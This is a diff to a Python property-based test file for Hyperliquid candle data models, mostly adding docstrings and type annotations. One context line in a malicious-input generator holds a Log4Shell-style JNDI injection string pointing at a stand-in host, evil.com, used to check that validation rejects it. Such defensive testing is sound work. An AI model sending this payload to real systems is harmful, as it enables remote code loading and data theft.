@@ -34,13 +34,21 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR CANDLE MODEL TESTING
 # =============================================================================
 
 
 def coin_strategy() -> SearchStrategy[str]:
-    """Generate valid coin/asset strings for candles."""
+    """Generate valid coin/asset strings for candles.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Common cryptocurrencies
         st.sampled_from([
@@ -77,7 +85,11 @@ def coin_strategy() -> SearchStrategy[str]:
 
 
 def interval_strategy() -> SearchStrategy[str]:
-    """Generate valid candle interval strings."""
+    """Generate valid candle interval strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from([
         "1m",  # 1 minute
         "3m",  # 3 minutes
@@ -98,7 +110,11 @@ def interval_strategy() -> SearchStrategy[str]:
 
 
 def timestamp_ms_strategy() -> SearchStrategy[int]:
-    """Generate valid millisecond timestamps."""
+    """Generate valid millisecond timestamps.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.one_of([
         # Valid timestamp ranges (in milliseconds)
         st.integers(min_value=0, max_value=2**53 - 1),  # JavaScript safe integer
@@ -111,7 +127,11 @@ def timestamp_ms_strategy() -> SearchStrategy[int]:
 
 
 def ohlcv_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for OHLCV values."""
+    """Generate decimal strings for OHLCV values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Common price values
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
@@ -131,7 +151,11 @@ def ohlcv_decimal_strategy() -> SearchStrategy[str]:
 
 
 def volume_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for volume (positive only)."""
+    """Generate decimal strings for volume (positive only).
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Common volume values
         st.decimals(min_value=Decimal(0), max_value=Decimal(1000000000), places=8).map(str),
@@ -149,7 +173,11 @@ def volume_decimal_strategy() -> SearchStrategy[str]:
 
 
 def status_string_strategy() -> SearchStrategy[str]:
-    """Generate valid status strings."""
+    """Generate valid status strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from([
         "ok",
         "OK",
@@ -164,7 +192,11 @@ def status_string_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_candle_snapshot_data(draw: st.DrawFn, num_candles: int | None = None) -> dict[str, Any]:
-    """Generate valid candle snapshot data."""
+    """Generate valid candle snapshot data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     if num_candles is None:
         num_candles = draw(st.integers(min_value=0, max_value=100))
 
@@ -188,7 +220,11 @@ def valid_candle_snapshot_data(draw: st.DrawFn, num_candles: int | None = None) 
 
 @st.composite
 def valid_candle_request_details_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid candle request details data."""
+    """Generate valid candle request details data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     start_time = draw(timestamp_ms_strategy())
     end_time = draw(
         st.integers(min_value=start_time, max_value=start_time + 86400000 * 30)
@@ -204,7 +240,11 @@ def valid_candle_request_details_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_ws_candle_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid WebSocket candle data."""
+    """Generate valid WebSocket candle data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     timestamp = draw(timestamp_ms_strategy())
 
     return {
@@ -222,8 +262,12 @@ def valid_ws_candle_data(draw: st.DrawFn) -> dict[str, Any]:
     }
 
 
-def malicious_candle_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for candle security testing."""
+def malicious_candle_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for candle security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Candle manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-candles}"),
@@ -276,7 +320,7 @@ class TestHyperliquidRawCandleSnapshotProperties:
     def test_candle_snapshot_validation_success_properties(
         self, candle_data: dict[str, Any]
     ) -> None:
-        """Property: Valid candle snapshot data should always create valid HyperliquidRawCandleSnapshot objects."""
+        """Property: Valid candle snapshot data should create valid HyperliquidRawCandleSnapshot."""
         # Skip invalid data
         try:
             # Validate all fields
@@ -324,10 +368,10 @@ class TestHyperliquidRawCandleSnapshotProperties:
         malicious_value=malicious_candle_strategy(),
     )
     def test_candle_snapshot_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Candle snapshot model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Candle snapshot model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "t": [1700000000000],
             "o": ["100.0"],
             "h": ["101.0"],
@@ -487,7 +531,7 @@ class TestHyperliquidRawCandleRequestProperties:
     def test_candle_request_details_validation_success_properties(
         self, request_details: dict[str, Any]
     ) -> None:
-        """Property: Valid candle request details should always create valid HyperliquidRawCandleRequestDetails objects."""
+        """Property: Valid request details should create valid candle request details."""
         # Skip invalid data
         try:
             assume(isinstance(request_details["coin"], str) and request_details["coin"].strip())
@@ -516,7 +560,7 @@ class TestHyperliquidRawCandleRequestProperties:
     def test_candle_snapshot_request_payload_validation_success_properties(
         self, request_details: dict[str, Any]
     ) -> None:
-        """Property: Valid candle snapshot request should always create valid HyperliquidRawCandleSnapshotRequestPayload objects."""
+        """Property: Valid candle snapshot request should create valid payload objects."""
         # Skip invalid data
         try:
             assume(isinstance(request_details["coin"], str) and request_details["coin"].strip())
@@ -528,7 +572,7 @@ class TestHyperliquidRawCandleRequestProperties:
         except (TypeError, KeyError):
             assume(False)
 
-        req_obj = HyperliquidRawCandleRequestDetails.model_validate(request_details)
+        HyperliquidRawCandleRequestDetails.model_validate(request_details)
 
         payload_data = {
             "type": "candleSnapshot",
@@ -586,7 +630,7 @@ class TestHyperliquidRawWsCandleProperties:
 
     @given(ws_candle_data=valid_ws_candle_data())
     def test_ws_candle_validation_success_properties(self, ws_candle_data: dict[str, Any]) -> None:
-        """Property: Valid WebSocket candle data should always create valid HyperliquidRawWsCandle objects."""
+        """Property: Valid WebSocket candle data should create valid objects."""
         # Skip invalid data
         try:
             # Validate string fields
@@ -637,10 +681,10 @@ class TestHyperliquidRawWsCandleProperties:
         malicious_value=malicious_candle_strategy(),
     )
     def test_ws_candle_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: WebSocket candle model should reject malicious inputs safely."""
-        base_data = {
+        """Property: WebSocket candle model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "t": 1700000000000,
             "T": 1700000060000,
             "s": "SOL",
@@ -737,7 +781,7 @@ class TestHyperliquidRawCandleIntegrationProperties:
     def test_candle_models_adversarial_input_properties(
         self, complete_malicious_data: dict[str, Any]
     ) -> None:
-        """Property: All candle models should safely handle complete adversarial input."""
+        """Property: All candle models should handle adversarial input safely."""
         # Property: Complete adversarial input should be safely rejected
         with pytest.raises((ValidationError, TypeError, StructureTypeError, ParsingError)):
             HyperliquidRawCandleSnapshot.model_validate(complete_malicious_data)
